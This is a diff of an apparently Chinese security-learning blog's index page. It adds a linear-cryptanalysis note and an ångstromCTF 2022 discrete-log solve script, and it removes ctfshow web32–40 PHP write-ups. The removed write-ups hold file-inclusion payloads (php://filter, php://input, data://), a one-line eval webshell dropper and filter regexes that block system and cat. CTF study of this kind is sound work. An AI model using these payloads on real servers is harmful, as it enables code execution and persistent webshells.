@@ -185,6 +185,206 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/%E7%BA%BF%E6%80%A7%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="MirRoR4s">
+      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习记录">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/17/%E7%BA%BF%E6%80%A7%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">线性密码分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-17 18:41:16 / 修改时间：18:56:22" itemprop="dateCreated datePublished" datetime="2022-05-17T18:41:16+08:00">2022-05-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>线性密码分析的思想：假设能够在一个明文比特子集与最后一轮即将进行代换的输入状态比特子集之间找到一个概率线性关系，即存在一个比特子集使得其中元素的异或表现出非随机的分布，比如该异或值以偏离1/2的概率取值0。我们使用已知明文攻击，对每一个明-密文对，用所有可能的候选密钥来对最后一轮的密文解密。对每一个候选密钥，计算包含在线性关系式中的相关状态比特的异或值，然后确定上述的线性关系是否成立，如果成立，就在对应于特定候选密钥的计数器上加1，在这个过程的最后，我们希望计数频率里明-密文对数的一半最远的候选密钥含有哪些密钥比特的正确值。</p>
+<p>堆积引理：<img src="../images/1652784166365.png" alt="1652784166365"></p>
+<p>随机变量$X_i$取值于集合$\{0,1\}$，偏差定义为随机变量$X_i$取值为0的概率$p_i$与$1/2$的差值。</p>
+<p>证明采用的是数学归纳法，在此不加证明。</p>
+<p><img src="../images/1652784808313.png" alt="1652784808313"></p>
+<p>推论3.2是很显然的，不过我们要注意堆积引理一般只有在随机变量$X_i$统计独立的情况下才成立。</p>
+<p><img src="../images/1652784977989.png" alt="1652784977989"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/08/angstromCTF-2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="MirRoR4s">
+      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习记录">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/08/angstromCTF-2022/" class="post-title-link" itemprop="url">ångstromCTF 2022</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-08 22:10:19" itemprop="dateCreated datePublished" datetime="2022-05-08T22:10:19+08:00">2022-05-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-11 22:04:17" itemprop="dateModified" datetime="2022-05-11T22:04:17+08:00">2022-05-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>浅析一下本次比赛中log log log的数学逻辑。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbits</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flagbits = <span class="built_in">len</span>(flag) * <span class="number">8</span></span><br><span class="line">flag = <span class="built_in">int</span>(flag.<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">q = <span class="number">127049168626532606399765615739991416718436721363030018955400489736067198869364016429387992001701094584958296787947271511542470576257229386752951962268029916809492721741399393261711747273503204896435780180020997260870445775304515469411553711610157730254858210474308834307348659449375607755507371266459204680043</span></span><br><span class="line">p = q * <span class="number">2</span>^<span class="number">1024</span> + <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p <span class="keyword">in</span> Primes()</span><br><span class="line">nbits = p.nbits()-<span class="number">1</span></span><br><span class="line">e = randbits(nbits-flagbits)</span><br><span class="line">e &lt;&lt;= flagbits</span><br><span class="line">e |= flag</span><br><span class="line">K = GF(p) <span class="comment">#定义大小为p的有限域K</span></span><br><span class="line"><span class="comment">#K的阶数应该是p-1，g是生成元，那么g的p-1次方应该modp同a余1</span></span><br><span class="line">g = K.multiplicative_generator()<span class="comment">#返回这个域的生成元g，有限域肯定是乘法循环群</span></span><br><span class="line">a = g^e</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(p))</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line"><span class="built_in">print</span>(flagbits)</span><br><span class="line"><span class="number">0xb4ec8caf1c16a20c421f4f78f3c10be621bc3f9b2401b1ecd6a6b536c9df70bdbf024d4d4b236cbfcb202b702c511aded6141d98202524709a75a13e02f17f2143cd01f2867ca1c4b9744a59d9e7acd0280deb5c256250fb849d96e1e294ad3cf787a08c782ec52594ef5fcf133cd15488521bfaedf485f37990f5bd95d5796b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">0xaf99914e5fb222c655367eeae3965f67d8c8b3a0b3c76c56983dd40d5ec45f5bcde78f7a817dce9e49bdbb361e96177f95e5de65a4aa9fd7eafec1142ff2a58cab5a755b23da8aede2d5f77a60eff7fb26aec32a9b6adec4fe4d5e70204897947eb441cc883e4f83141a531026e8a1eb76ee4bff40a8596106306fdd8ffec9d03a9a54eb3905645b12500daeabdb4e44adcfcecc5532348c47c41e9a27b65e71f8bc7cbdabf25cd0f11836696f8137cd98088bd244c56cdc2917efbd1ac9b6664f0518c5e612d4acdb81265652296e4471d894a0bd415b5af74b9b75d358b922f6b088bc5e81d914ae27737b0ef8b6ac2c9ad8998bd02c1ed90200ad6fff4a37</span></span><br><span class="line"><span class="number">880</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先题目给的是$a\equiv g^e \mod p,g$是乘法群的生成元，在这里开始了分裂的第一点，有限域的乘法群是一个循环群，而循环群的生成元的阶数跟群的阶数是一致的，在本题中乘法群的单位元是1，而sage求的群的阶是p，那么应该有$g^p \equiv 1$,但实际是$g^p\equiv g,g^{p-1}\equiv1$。这是特别分裂的一个点，所以猜测有限域的阶p或许指代加法群的阶，而乘法群的阶是p-1，(0到底算不算在乘法群里面？) 等以后对环域的知识更加了解再来补。</p>
+<p>开始解题：可以看到只要求出了e，就可以得到flag。仔细分析代码就会发现flag的880bits就是e的低位880bits，所以问题就变为了如何求e的低880bits。</p>
+<p>因为p是素数，根据费马小定理我们有$g^{p-1}\equiv1\mod p$ ，而$p-1&#x3D;2^{1024}*q$</p>
+<p>这说明$g^q这个元素的阶是2^{1024}$,接下来看图</p>
+<p><img src="/../images/1652019382086-1652277854891.png" alt="1652019382086"></p>
+<p>Pohlig-Hellman在sage的discrete_log函数自带的，直接调用就好，具体的算法实现看百度</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">q=<span class="number">127049168626532606399765615739991416718436721363030018955400489736067198869364016429387992001701094584958296787947271511542470576257229386752951962268029916809492721741399393261711747273503204896435780180020997260870445775304515469411553711610157730254858210474308834307348659449375607755507371266459204680043</span></span><br><span class="line">p = q * <span class="number">2</span>^<span class="number">1024</span> + <span class="number">1</span></span><br><span class="line">K = GF(p)</span><br><span class="line">g = K(<span class="number">3</span>)</span><br><span class="line">a=K(<span class="number">0xaf99914e5fb222c655367eeae3965f67d8c8b3a0b3c76c56983dd40d5ec45f5bcde78f7a817dce9e49bdbb361e96177f95e5de65a4aa9fd7eafec1142ff2a58cab5a755b23da8aede2d5f77a60eff7fb26aec32a9b6adec4fe4d5e70204897947eb441cc883e4f83141a531026e8a1eb76ee4bff40a8596106306fdd8ffec9d03a9a54eb3905645b12500daeabdb4e44adcfcecc5532348c47c41e9a27b65e71f8bc7cbdabf25cd0f11836696f8137cd98088bd244c56cdc2917efbd1ac9b6664f0518c5e612d4acdb81265652296e4471d894a0bd415b5af74b9b75d358b922f6b088bc5e81d914ae27737b0ef8b6ac2c9ad8998bd02c1ed90200ad6fff4a37</span>)</span><br><span class="line">g^=q</span><br><span class="line">a^=q</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">long_to_bytes(discrete_log(a,g,<span class="built_in">ord</span>=<span class="number">2</span>^<span class="number">1024</span>))</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/07/BSGS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="MirRoR4s">
+      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习记录">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/07/BSGS/" class="post-title-link" itemprop="url">BSGS</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-07 21:01:17 / 修改时间：21:01:27" itemprop="dateCreated datePublished" datetime="2022-05-07T21:01:17+08:00">2022-05-07</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><img src="/../images/1651928485488.png" alt="1651928485488"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/02/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E7%AC%94%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -320,7 +520,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-05-07 11:25:52" itemprop="dateModified" datetime="2022-05-07T11:25:52+08:00">2022-05-07</time>
+                <time title="修改时间：2022-05-09 15:55:40" itemprop="dateModified" datetime="2022-05-09T15:55:40+08:00">2022-05-09</time>
               </span>
 
           
@@ -334,358 +534,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>code:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>第一次见过滤分号的，而且是eval。eval函数将传入的字符串当作php代码执行，而我们都知道php代码不以分号结尾会报错，所以我卡住了。看提示是</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]<span class="meta">?&gt;</span>&amp;url=php:<span class="comment">//filter/read=convert.base64-</span></span><br><span class="line">encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-
-<p>太惊讶了，还有这种包含方式？说实话不理解其中原理，只能硬记下来。 <strong>php中include是可以不带括号的函数</strong> </p>
-<p>试试php:&#x2F;&#x2F;input伪协议上传一句话木马</p>
-<p>url传参：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]<span class="meta">?&gt;</span>&amp;url=php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure>
-
-<p>post传数据:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[v]);?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>直接获取webshell！</p>
-<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>跟上一题相比就多过滤了一个双引号，payload:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>code:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>多过滤了:  payload跟33题一样。。</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=$nice=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>code:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>太搞了吧？过滤了&#x3D;号，然而有啥用</p>
-<p>payload：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>code:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>不允许出现数字，还是老payload，简单改一改。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>所以说，是要告诉我们GET传参可以不用加单引号 双引号是吗？</p>
-<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>code：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>终于换题目了。。。</p>
-<p>尝试php:&#x2F;&#x2F;input写shell</p>
-<p>url中传入?c&#x3D;php:&#x2F;&#x2F;input</p>
-<p>post传参</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[v]);?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>成功访问，直接拿flag。这题目应该一直打开着allow</p>
-<p>喔，官方题解是</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>
-
-<p>嗯，用data伪协议达到执行php代码的效果。</p>
-<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>code:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>用不了php:&#x2F;&#x2F;input伪协议了，只能用data，跟上题一样的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,base64的php代码</span><br></pre></td></tr></table></figure>
-
-<p>如</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>学到了这题。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>尝试%00截断失败了，看提示还是data伪协议，<img src="/../images/1651220785981.png" alt="1651220785981"></p>
-<p>payload:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>code:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这题真的学到了。题目小心机，过滤的括号是中文的，实际上英文的括号没有被过滤。</p>
-<p>但是单双引号 + 双斜杠被过滤了，导致前面的payload都不好使了。只能无参数RCE。</p>
-<p>提示说的是GXYCTF禁止套娃，让我们去看看那道题吧。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">          </span><br><span class="line">      </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>跟本题真的很像了，过滤了各种php伪协议，第二个if有点难看懂。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;]))</span><br></pre></td></tr></table></figure>
-
-<p>?R是引用当前表达式，后面再加上?形成递归调用。</p>
-<p> 也就是说，这里这种代码才能通过匹配 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a();</span><br><span class="line">a(b(c()));</span><br><span class="line">像下面的这种是不可以的,典型的无参数RCE。：a(&quot;123&quot;);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。</span><br><span class="line">2.过滤了常用的几个伪协议，不能以伪协议读取文件。</span><br><span class="line">3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。</span><br><span class="line">4.正则匹配掉了et/na/info等关键字，很多函数都用不了。</span><br><span class="line">5：eval($_GET[&#x27;exp&#x27;]); 典型的无参数RCE</span><br></pre></td></tr></table></figure>
-
-<p>但是无参数如何通过eval执行系统命令拿flag呢？</p>
-<p>可以通过一些无参的函数作为有参函数的参数来实现。</p>
-<h3 id="3-1-print-r"><a href="#3-1-print-r" class="headerlink" title="3.1 print_r()"></a>3.1 print_r()</h3><p>读取文件函数，相似的函数还有：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpfile_get_content()</span><br><span class="line">readfile()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-2-localeconv"><a href="#3-2-localeconv" class="headerlink" title="3.2 localeconv()"></a>3.2 localeconv()</h3><p>返回一个包含本地数字及货币格式信息的数组。</p>
-<h3 id="3-4-current-x2F-pos"><a href="#3-4-current-x2F-pos" class="headerlink" title="3.4 current()&#x2F;pos()"></a>3.4 current()&#x2F;pos()</h3><p>返回数组中的当前单元，默认取第一个值。</p>
